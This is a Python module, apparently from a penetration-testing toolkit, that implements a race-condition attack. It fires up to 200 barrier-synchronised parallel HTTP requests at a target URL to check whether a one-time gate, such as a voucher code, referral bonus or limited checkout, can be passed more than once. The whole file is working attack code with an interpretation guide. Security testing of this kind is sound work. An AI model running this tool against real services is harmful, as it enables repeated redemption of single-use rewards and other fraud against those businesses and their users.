"""Race-condition primitive — parallel-request differential.

Stdlib-only implementation of a Turbo-Intruder-style attack: launch N
threads that each send the same HTTP request, started as close to
simultaneously as a Barrier allows. If the server's gate logic is not
atomic (e.g. one-time codes, referral bonuses, limited inventory checkout,
concurrent session limits), more than one request observes the "pre-gate"
response while the others would have been refused.

This is not a true single-packet attack (which requires last-byte
synchronization at the TCP layer); for that, run Turbo Intruder or h2c
last-byte-sync via httpx-lib in a follow-up. The threaded version still
catches most app-layer races in practice.

opts shape::
    {
      "method":         "POST",
      "headers":        {"Cookie": "session=..."},
      "body":           optional dict or string,
      "n":              parallel count (default 30),
      "success_status": status that means "gate accepted" (default 200),
    }

Result interpretation:
  - >1 success status returned ⇒ race condition signal (success).
  - exactly 1 success + (N-1) refused ⇒ gate is atomic (negative).
  - 0 successes ⇒ inconclusive (auth failed, endpoint blocked).
"""
from __future__ import annotations

import json
import threading
import time
import urllib.request
import urllib.error
from typing import Any, Dict, List

from .base import AttackResult, _result_error


def _do_request(url: str, method: str, headers: Dict[str, str],
                body: Any, timeout: int) -> Dict[str, Any]:
    data = None
    h = dict(headers or {})
    if body is not None and method != "GET":
        if isinstance(body, (dict, list)):
            data = json.dumps(body).encode("utf-8")
            h.setdefault("Content-Type", "application/json")
        else:
            data = str(body).encode("utf-8")
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return {"status": resp.status, "len": len(resp.read())}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "len": 0}
    except Exception as e:
        return {"status": -1, "len": 0, "error": str(e)}


def run(target: str, opts: Dict[str, Any]) -> AttackResult:
    if not target:
        return _result_error("race", "target URL required")
    method  = opts.get("method", "POST")
    headers = opts.get("headers") or {}
    body    = opts.get("body")
    n       = int(opts.get("n", 30))
    success_status = int(opts.get("success_status", 200))
    timeout = int(opts.get("timeout_s", 20))

    if n < 2 or n > 200:
        return _result_error("race", "n must be between 2 and 200")

    barrier = threading.Barrier(n)
    results: List[Dict[str, Any]] = [None] * n

    def _worker(idx: int) -> None:
        try:
            barrier.wait(timeout=10)
        except threading.BrokenBarrierError:
            results[idx] = {"status": -1, "len": 0, "error": "barrier"}
            return
        results[idx] = _do_request(target, method, headers, body, timeout)
        results[idx]["t"] = time.time()

    threads = [threading.Thread(target=_worker, args=(i,), daemon=True,
                                name=f"race-{i}")
               for i in range(n)]
    start = time.time()
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=timeout + 5)
    elapsed = time.time() - start

    successes = [r for r in results if r and r["status"] == success_status]
    n_success = len(successes)

    evidence = [
        {"index": i, **(r or {"status": -1, "len": 0})}
        for i, r in enumerate(results)
    ]

    if n_success > 1:
        return AttackResult(
            technique="race", success=True, confidence=min(0.6 + 0.1 * n_success, 0.95),
            summary=(f"Race condition: {n_success}/{n} parallel requests received "
                     f"{success_status} from a presumably single-shot gate "
                     f"(elapsed {elapsed:.2f}s)"),
            evidence=evidence,
        )
    if n_success == 1:
        return AttackResult(
            technique="race", success=False, confidence=0.0,
            summary=(f"Gate is atomic: exactly 1/{n} requests succeeded "
                     f"(elapsed {elapsed:.2f}s)"),
            evidence=evidence,
        )
    return AttackResult(
        technique="race", success=False, confidence=0.0,
        summary=f"Inconclusive: 0/{n} requests returned {success_status} "
                f"(check auth / endpoint)",
        evidence=evidence,
    )
